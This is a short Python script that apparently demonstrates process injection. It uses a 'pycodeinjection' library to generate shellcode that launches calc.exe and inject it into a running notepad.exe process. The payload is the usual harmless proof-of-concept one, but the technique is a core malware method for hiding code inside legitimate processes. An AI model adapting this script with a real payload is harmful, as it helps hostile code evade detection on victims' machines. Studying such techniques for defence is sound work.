#!/usr/bin/python
from pycodeinjection import *

target_pid = getPID("notepad.exe")
shellcode = generateShellcode("calc.exe")
injectShellcode(target_pid, shellcode)